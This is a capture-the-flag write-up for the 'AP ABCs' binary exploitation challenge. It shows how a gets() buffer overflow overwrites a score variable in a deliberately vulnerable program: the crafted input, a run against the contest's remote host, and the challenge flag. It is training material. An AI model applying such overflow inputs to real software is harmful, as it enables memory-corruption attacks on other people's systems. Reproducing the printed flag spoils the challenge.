# AP ABCs
**Category :** binex

## Description
Oh wow, they put a freshman in AP ABCs? Never thought I'd see this happen. Anyways, good luck, and make sure to not cheat on your AP test!

## Solution
Given :-
- binary file (ap-abcs)
- source file (ap-abcs.c)
- netcat host and port

Binary file is ELF(linux) 64bit.
```
$ file ap-abcs
ap-abcs: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=42321f439d044b8521675d20b2e897f7019f0b11, for GNU/Linux 3.2.0, not stripped
```
Tried compiling the source file and it produces a warning for gets() function.
```
$ gcc ap-abcs.c
ap-abcs.c: In function ‘main’:
ap-abcs.c:66:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   66 |     gets(response);
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/ccAONohq.o: in function `main':
ap-abcs.c:(.text+0x2ce): warning: the `gets' function is dangerous and should not be used.
```
Looked for the [gets() function](https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm) in google and found that it reads input till it hits the newline character. So, we can overflow the input buffer *response* which can only hold 50 bytes.

So, lets overflow the buffer and re-write the *score* variable.

### Attempt 1
```
$ ./ap-abcs
...
╔══════════════════════════════════════════╗
║          2021 AP® Alphabet FRQs          ║
║                                          ║
║                 ALPHABET                 ║
║                Section II                ║
║             Total Time—1 hour            ║
║           Number of Questions—1          ║
║                                          ║
║                                          ║
║ 1. Recite the alphabet                   ║
║                                          ║
║ ──────────────────────────────────────── ║
║                                          ║
║                                          ║
║                                          ║
║                   STOP                   ║
║                END OF EXAM               ║
║                                          ║
║                    -2-                   ║
╚══════════════════════════════════════════╝

Answer for 1: abcdefghijklmnopqrstuvwxyz hahjfhkhdg kglkasgk dgfjh augh aiugh kjg akjgnaskgai uhgierhg bgfb ifghg hegh erug ewrii ghhfq

You got a 5 on your APs.
Nice job!
Segmentation fault (core dumped)
```
Even though we overflowed the buffer, still the score returns exact value.
```
 62     printf("Answer for 1: ");
 63     gets(response);
 64
 65     for (int i = 0; i < 26; ++i) {
 66         if (response[i] == 0)
 67             break;
 68         if (response[i] != correct[i])
 69             break;
 70
 71         if (i == 0)
 72             score = 1;
 73         if (i == 7 || i == 14 || i == 20 || i == 24)
 74             ++score;
 75     }
```
After looking at the code we find that after the overflow of *response* variable, the value of *score* is set again (line 72 & 74). So, we should not be adding the a..z values and skip the for loop all together like adding '0' at start.
### Attempt 2
```
$ ./ap-abcs
...
Answer for 1: 0gkadg jgh hghgkjh kghwerroigh hgskdhvskgn akegweirgh gfhkzakggf skhgse igheitheg   jgsgj

You got a 1701344361 on your APs.
Inconsistency detected by ld.so: ../elf/dl-runtime.c: 80: _dl_fixup: Assertion `ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT' failed!
```
Now we can see that value of *score* got changed. Ok what is the value in it then.
```
$ python3 -c 'print(bytes.fromhex(hex(1701344361)[2:]).decode("utf-8"))'
ehti
```
Now we need to find this value from our above provided input. Due to little endian, we need to look for the string in reverse.
```
$ printf "0gkadg jgh hghgkjh kghwerroigh hgskdhvskgn akegweirgh gfhkzakggf skhgse igheitheg   jgsgj" | grep "ithe"
```
But we need to hit the required *score* value *0x73434241*. So we need to replace the *"ithe"* with *"ABCs"*.
```
$ python3 -c 'print(bytes.fromhex("0x73434241"[2:]).decode("utf-8"))'
sCBA
$ ./ap-abcs
...
Answer for 1: 0gkadg jgh hghgkjh kghwerroigh hgskdhvskgn akegweirgh gfhkzakggf skhgse igheABCs

You got a 1933787713 on your APs.
Tsk tsk tsk.
Cheating on the AP® tests is really bad!
Let me read you the College Board policies:
AAAA, I lost my notes!
You stay here while I go look for them.
And don't move, you're still in trouble!
[If you are seeing this on the remote server, please contact admin].

$ nc bin.bcactf.com 49154
...
Answer for 1: 0gkadg jgh hghgkjh kghwerroigh hgskdhvskgn akegweirgh gfhkzakggf skhgse igheABCs

You got a 1933787713 on your APs.
Tsk tsk tsk.
Cheating on the AP® tests is really bad!
Let me read you the College Board policies:
...
And take your flag: bcactf{bca_is_taking_APs_in_june_aaaaaaaa_wish_past_me_luck}
```

## Flag
bcactf{bca_is_taking_APs_in_june_aaaaaaaa_wish_past_me_luck}